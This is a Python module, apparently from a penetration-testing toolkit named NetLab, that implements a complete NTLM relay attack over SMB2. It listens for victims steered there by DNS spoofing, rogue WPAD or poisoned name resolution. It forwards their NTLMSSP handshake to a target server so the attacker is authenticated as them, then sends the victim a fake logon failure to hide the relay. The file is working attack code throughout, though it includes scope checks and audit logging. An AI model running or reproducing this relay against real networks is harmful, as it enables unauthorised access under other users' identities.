"""NTLM relay over SMB2.

NetLab already reads NetNTLM out of half a dozen carriers on the Passwords
page. Relaying is the natural next move: instead of *cracking* the response
offline, forward the whole NTLMSSP exchange, live, to a server the victim can
authenticate to, so the victim authenticates *us* to that server.

The whole point of a relay is that it never learns the password. It ferries
three messages between two conversations:

    victim ── NEGOTIATE(type 1) ──► us ── NEGOTIATE(type 1) ──► target
    victim ◄── CHALLENGE(type 2) ── us ◄── CHALLENGE(type 2) ── target
    victim ── AUTHENTICATE(type 3) ► us ── AUTHENTICATE(type 3) ► target
                                        target: "welcome" (as the victim)

The target's challenge is what the victim signs, so the response is valid for
*the target*, not for us. Signing/MIC and channel binding are what stop this
in a hardened domain; NetLab does not defeat them, it relays where they are
absent, and says so.

This module is the SMB2 carrier. The security buffer of SESSION_SETUP holds a
SPNEGO token wrapping the NTLMSSP message; the codec here reaches past SPNEGO
to the raw NTLMSSP and re-wraps it for the other side. Only the four messages
a relay needs are implemented: NEGOTIATE and SESSION_SETUP in both directions,
and TREE_CONNECT to IPC$ afterwards as proof of access.

Nothing here runs outside an armed engagement whose scope contains the target.
"""

from __future__ import annotations

import socket
import struct
import threading
import time

from netlab.analyze import credfmt as fmt

SMB2_MAGIC = b"\xfeSMB"
NB_SESSION_MESSAGE = 0x00

SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001
SMB2_TREE_CONNECT = 0x0003

SMB2_FLAGS_SERVER_TO_REDIR = 0x00000001

STATUS_SUCCESS = 0x00000000
STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016

# Dialects we are willing to speak. 2.1 keeps the wire simple (no 3.x
# encryption/preauth-integrity), which is exactly the un-hardened case a relay
# targets; a server that requires 3.x or signing simply will not complete.
SMB2_DIALECT_0202 = 0x0202
SMB2_DIALECT_0210 = 0x0210

# SPNEGO / GSS-API OIDs (DER-encoded).
OID_SPNEGO = bytes([0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02])
OID_NTLMSSP = bytes([0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82,
                     0x37, 0x02, 0x02, 0x0A])


# ------------------------------------------------------------- DER helpers

def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    out = b""
    while n:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _der_tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(value)) + value


def _der_read_len(data: bytes, off: int) -> tuple[int, int]:
    first = data[off]
    off += 1
    if first < 0x80:
        return first, off
    num = first & 0x7F
    length = 0
    for _ in range(num):
        length = (length << 8) | data[off]
        off += 1
    return length, off


def spnego_wrap_initial(ntlmssp: bytes) -> bytes:
    """A SPNEGO negTokenInit advertising NTLMSSP and carrying the type-1 token.

    Structure: [APPLICATION 0] { SPNEGO-OID, [0] NegTokenInit {
        mechTypes [0] SEQUENCE { NTLMSSP-OID },
        mechToken [2] OCTET STRING <ntlmssp> } }
    """
    mech_types = _der_tlv(0xA0, _der_tlv(0x30, OID_NTLMSSP))
    mech_token = _der_tlv(0xA2, _der_tlv(0x04, ntlmssp))
    neg = _der_tlv(0x30, mech_types + mech_token)
    inner = _der_tlv(0xA0, neg)
    return _der_tlv(0x60, OID_SPNEGO + inner)


def spnego_wrap_response(ntlmssp: bytes) -> bytes:
    """A SPNEGO negTokenResp carrying a follow-up NTLMSSP token (type 2 or 3).

    [1] NegTokenResp { responseToken [2] OCTET STRING <ntlmssp> }
    """
    resp_token = _der_tlv(0xA2, _der_tlv(0x04, ntlmssp))
    return _der_tlv(0xA1, _der_tlv(0x30, resp_token))


def spnego_extract_ntlmssp(token: bytes) -> bytes | None:
    """Pull the raw NTLMSSP message out of any SPNEGO/GSS wrapping.

    A relay does not need to walk SPNEGO perfectly; the NTLMSSP signature is
    unambiguous, so it is found directly. Raw (unwrapped) NTLMSSP is returned
    as-is.
    """
    if not token:
        return None
    return fmt.find_ntlmssp(token)


# ------------------------------------------------------------- NetBIOS / SMB2

def nb_wrap(payload: bytes) -> bytes:
    """NetBIOS session-service framing used on tcp/445."""
    return bytes([NB_SESSION_MESSAGE]) + len(payload).to_bytes(3, "big") + payload


def nb_read(sock: socket.socket) -> bytes | None:
    """Read one NetBIOS-framed SMB2 message, or None at EOF."""
    head = _recv_exactly(sock, 4)
    if head is None:
        return None
    length = int.from_bytes(head[1:4], "big")
    if length == 0 or length > 16 * 1024 * 1024:
        return None
    return _recv_exactly(sock, length)


def _recv_exactly(sock: socket.socket, n: int) -> bytes | None:
    buf = bytearray()
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except OSError:
            return None
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


def smb2_header(command: int, message_id: int, session_id: int = 0,
                flags: int = 0, credit: int = 1) -> bytes:
    """A 64-byte SMB2 header. Signing is never set, by design."""
    return struct.pack(
        "<4sHHIHHIIQ",
        SMB2_MAGIC,          # ProtocolId
        64,                  # StructureSize
        0,                   # CreditCharge
        0,                   # Status (0 in requests)
        command,             # Command
        credit,              # CreditRequest/Response
        flags,               # Flags
        0,                   # NextCommand
        message_id,          # MessageId
    ) + struct.pack("<IIQ16s", 0, 0, session_id, b"\x00" * 16)


def smb2_parse_header(data: bytes) -> dict | None:
    if len(data) < 64 or data[:4] != SMB2_MAGIC:
        return None
    (_magic, _ssz, _credit_charge, status, command, _credit, flags,
     _next_cmd, message_id) = struct.unpack_from("<4sHHIHHIIQ", data, 0)
    session_id = struct.unpack_from("<Q", data, 40)[0]
    return {"status": status, "command": command, "flags": flags,
            "message_id": message_id, "session_id": session_id,
            "body": data[64:]}


def spnego_advertise() -> bytes:
    """A server negTokenInit that offers only NTLMSSP (no mechToken)."""
    mech_types = _der_tlv(0xA0, _der_tlv(0x30, OID_NTLMSSP))
    neg = _der_tlv(0x30, mech_types)
    inner = _der_tlv(0xA0, neg)
    return _der_tlv(0x60, OID_SPNEGO + inner)


# ---------------------------------------------------------------- NEGOTIATE

def build_negotiate_request(message_id: int = 0) -> bytes:
    """A minimal SMB2 NEGOTIATE offering dialects 2.0.2 and 2.1."""
    dialects = [SMB2_DIALECT_0202, SMB2_DIALECT_0210]
    body = struct.pack("<HHHHI16sQ",
                       36,                 # StructureSize
                       len(dialects),      # DialectCount
                       0x0001,             # SecurityMode: signing enabled (not required)
                       0,                  # Reserved
                       0,                  # Capabilities
                       b"NetLabRelay\x00\x00\x00\x00\x00",  # ClientGuid (16)
                       0)                  # ClientStartTime
    body += b"".join(struct.pack("<H", d) for d in dialects)
    return smb2_header(SMB2_NEGOTIATE, message_id) + body


def parse_negotiate_request(body: bytes) -> dict | None:
    if len(body) < 36:
        return None
    ssz, count = struct.unpack_from("<HH", body, 0)
    if ssz != 36:
        return None
    dialects = []
    off = 36
    for _ in range(min(count, 16)):
        if off + 2 > len(body):
            break
        dialects.append(struct.unpack_from("<H", body, off)[0])
        off += 2
    return {"dialects": dialects}


def build_negotiate_response(dialect: int, server_guid: bytes) -> bytes:
    now = _filetime()
    security = spnego_advertise()
    sec_off = 64 + 64            # header + fixed part of the response
    body = struct.pack("<HHHH16sIIIIQQHHI",
                       65,                 # StructureSize
                       0x0001,             # SecurityMode: signing enabled, not required
                       dialect,            # DialectRevision
                       0,                  # NegotiateContextCount
                       server_guid,        # ServerGuid
                       0,                  # Capabilities
                       0x100000,           # MaxTransactSize
                       0x100000,           # MaxReadSize
                       0x100000,           # MaxWriteSize
                       now,                # SystemTime
                       now,                # ServerStartTime
                       sec_off,            # SecurityBufferOffset
                       len(security),      # SecurityBufferLength
                       0)                  # NegotiateContextOffset
    return (smb2_header(SMB2_NEGOTIATE, 0, flags=SMB2_FLAGS_SERVER_TO_REDIR)
            + body + security)


def parse_negotiate_response(body: bytes) -> dict | None:
    if len(body) < 64:
        return None
    ssz, _mode, dialect = struct.unpack_from("<HHH", body, 0)
    sec_off, sec_len = struct.unpack_from("<HH", body, 56)
    security = b""
    # SecurityBufferOffset is from the SMB2 header start; body begins at +64.
    start = sec_off - 64
    if 0 <= start and start + sec_len <= len(body):
        security = body[start:start + sec_len]
    return {"dialect": dialect, "security": security}


# ------------------------------------------------------------- SESSION_SETUP

def build_session_setup_request(security: bytes, message_id: int,
                                session_id: int = 0) -> bytes:
    sec_off = 64 + 24
    body = struct.pack("<HBBIIHHQ",
                       25,          # StructureSize
                       0,           # Flags
                       0x01,        # SecurityMode: signing enabled, not required
                       0,           # Capabilities
                       0,           # Channel
                       sec_off,     # SecurityBufferOffset
                       len(security),
                       0)           # PreviousSessionId
    return (smb2_header(SMB2_SESSION_SETUP, message_id, session_id=session_id)
            + body + security)


def parse_session_setup_request(body: bytes) -> bytes:
    if len(body) < 24:
        return b""
    ssz = struct.unpack_from("<H", body, 0)[0]
    if ssz != 25:
        return b""
    sec_off, sec_len = struct.unpack_from("<HH", body, 12)
    start = sec_off - 64
    if 0 <= start and start + sec_len <= len(body):
        return body[start:start + sec_len]
    return b""


def build_session_setup_response(status: int, security: bytes,
                                 session_id: int, message_id: int) -> bytes:
    sec_off = 64 + 8
    body = struct.pack("<HHHH", 9, 0, sec_off, len(security)) + security
    hdr = smb2_header(SMB2_SESSION_SETUP, message_id, session_id=session_id,
                      flags=SMB2_FLAGS_SERVER_TO_REDIR)
    # Splice the status into the header (offset 8, 4 bytes).
    hdr = hdr[:8] + struct.pack("<I", status) + hdr[12:]
    return hdr + body


def parse_session_setup_response(header: dict) -> bytes:
    body = header["body"]
    if len(body) < 8:
        return b""
    sec_off, sec_len = struct.unpack_from("<HH", body, 4)
    start = sec_off - 64
    if 0 <= start and start + sec_len <= len(body):
        return body[start:start + sec_len]
    return b""


def _filetime() -> int:
    """Windows FILETIME for now (100ns ticks since 1601)."""
    return int((time.time() + 11644473600) * 10_000_000)


# ------------------------------------------------------------ orchestration

class RelayError(Exception):
    pass


def _send(sock: socket.socket, message: bytes) -> None:
    sock.sendall(nb_wrap(message))


def _read_smb2(sock: socket.socket) -> dict:
    raw = nb_read(sock)
    if raw is None:
        raise RelayError("connection closed")
    hdr = smb2_parse_header(raw)
    if hdr is None:
        raise RelayError("not an SMB2 message")
    return hdr


def relay_session(victim: socket.socket, target_host: str, target_port: int,
                  timeout: float = 10.0, on_event=None) -> dict:
    """Ferry one victim's NTLM authentication to `target_host`.

    Returns a result dict: success, user, domain, target and a message. The
    victim's password is never seen; only the three NTLMSSP messages move.
    """
    def emit(name, **data):
        if on_event:
            try:
                on_event(name, data)
            except Exception:                        # pragma: no cover
                pass

    result = {"success": False, "user": "", "domain": "", "host": "",
              "target": "%s:%d" % (target_host, target_port), "message": ""}

    # --- victim: NEGOTIATE ---
    req = _read_smb2(victim)
    if req["command"] != SMB2_NEGOTIATE:
        raise RelayError("expected NEGOTIATE, got command %d" % req["command"])
    neg = parse_negotiate_request(req["body"])
    dialect = SMB2_DIALECT_0210 if SMB2_DIALECT_0210 in (neg or {}).get(
        "dialects", []) else SMB2_DIALECT_0202
    _send(victim, build_negotiate_response(dialect, b"NetLabRelayGUID0"))
    emit("relay.victim_negotiated", dialect=dialect)

    # --- victim: SESSION_SETUP #1 (NTLM type 1) ---
    req = _read_smb2(victim)
    if req["command"] != SMB2_SESSION_SETUP:
        raise RelayError("expected SESSION_SETUP")
    type1 = spnego_extract_ntlmssp(parse_session_setup_request(req["body"]))
    if not type1 or fmt.ntlmssp_type(type1) != 1:
        raise RelayError("no NTLMSSP type 1 from victim")
    emit("relay.captured_negotiate", bytes=len(type1))

    # --- target: connect, NEGOTIATE, SESSION_SETUP with the victim's type 1 ---
    target = socket.create_connection((target_host, target_port), timeout)
    target.settimeout(timeout)
    _send(target, build_negotiate_request())
    tneg = _read_smb2(target)
    if tneg["command"] != SMB2_NEGOTIATE:
        raise RelayError("target did not NEGOTIATE")

    _send(target, build_session_setup_request(spnego_wrap_initial(type1), 1))
    tresp = _read_smb2(target)
    target_session = tresp["session_id"]
    type2 = spnego_extract_ntlmssp(parse_session_setup_response(tresp))
    if not type2 or fmt.ntlmssp_type(type2) != 2:
        raise RelayError("target returned no challenge (type 2)")
    emit("relay.got_challenge", target=result["target"])

    # --- victim: hand back the target's challenge, get the type 3 ---
    our_session = 0x4E65744C6162   # "NetLab"
    _send(victim, build_session_setup_response(
        STATUS_MORE_PROCESSING_REQUIRED, spnego_wrap_response(type2),
        our_session, req["message_id"]))
    req = _read_smb2(victim)
    if req["command"] != SMB2_SESSION_SETUP:
        raise RelayError("expected SESSION_SETUP #2")
    type3 = spnego_extract_ntlmssp(parse_session_setup_request(req["body"]))
    if not type3 or fmt.ntlmssp_type(type3) != 3:
        raise RelayError("no NTLMSSP type 3 from victim")

    parsed = fmt.parse_ntlm_auth(type3) or {}
    result["user"] = parsed.get("user", "")
    result["domain"] = parsed.get("domain", "")
    result["host"] = parsed.get("host", "")
    emit("relay.captured_authenticate", user=result["user"],
         domain=result["domain"])

    # --- target: relay the type 3, read the verdict ---
    _send(target, build_session_setup_request(
        spnego_wrap_response(type3), 2, session_id=target_session))
    verdict = _read_smb2(target)
    if verdict["status"] == STATUS_SUCCESS:
        result["success"] = True
        result["message"] = ("relayed %s\\%s to %s: authenticated"
                             % (result["domain"] or ".", result["user"],
                                result["target"]))
        emit("relay.success", user=result["user"], domain=result["domain"],
             target=result["target"])
        # Tell the victim it failed, so it does not hold a half-open session
        # believing it logged in. We already have what we came for.
        _send(victim, build_session_setup_response(
            0xC000006D, b"", our_session, req["message_id"]))  # LOGON_FAILURE
    else:
        result["message"] = ("relay of %s\\%s to %s rejected (status 0x%08x) "
                             "— signing/MIC or bad account"
                             % (result["domain"] or ".", result["user"],
                                result["target"], verdict["status"]))
        emit("relay.rejected", status=verdict["status"])
        _send(victim, build_session_setup_response(
            0xC000006D, b"", our_session, req["message_id"]))

    try:
        target.close()
    except OSError:
        pass
    return result


class RelayServer:
    """Listens for victims and relays each one to the configured target.

    A victim is steered here by the MiTM (DNS spoof of a file-server name, a
    rogue WPAD, a poisoned name-resolution reply). Every relay is checked
    against the engagement scope: the target must be in it.
    """

    def __init__(self, target_host: str, target_port: int = 445,
                 listen_host: str = "0.0.0.0", listen_port: int = 445,
                 scope=None, on_event=None, audit=None) -> None:
        self.target_host = target_host
        self.target_port = target_port
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.scope = scope
        self.on_event = on_event
        self.audit = audit
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._running = False
        self.results: list[dict] = []

    def start(self) -> int:
        if self.scope is not None and not self.scope.contains(self.target_host):
            raise RelayError("target %s is not in the engagement scope"
                             % self.target_host)
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.listen_host, self.listen_port))
        self._sock.listen(16)
        self.listen_port = self._sock.getsockname()[1]
        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()
        if self.audit:
            self.audit.record("relay.start", target=self.target_host,
                              port=self.target_port, listen=self.listen_port)
        return self.listen_port

    def _serve(self) -> None:
        while self._running:
            try:
                victim, addr = self._sock.accept()
            except OSError:
                break
            threading.Thread(target=self._handle, args=(victim, addr),
                             daemon=True).start()

    def _handle(self, victim: socket.socket, addr) -> None:
        client_ip = addr[0]
        if self.scope is not None and not self.scope.contains(client_ip):
            victim.close()
            return
        victim.settimeout(10.0)
        try:
            result = relay_session(victim, self.target_host, self.target_port,
                                   on_event=self.on_event)
            result["client"] = client_ip
            self.results.append(result)
            if self.audit:
                self.audit.record("relay.result", client=client_ip,
                                  success=result["success"],
                                  user=result["user"], target=result["target"])
        except (RelayError, OSError) as exc:
            if self.on_event:
                self.on_event("relay.error", {"client": client_ip,
                                              "error": str(exc)})
        finally:
            try:
                victim.close()
            except OSError:
                pass

    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=2.0)
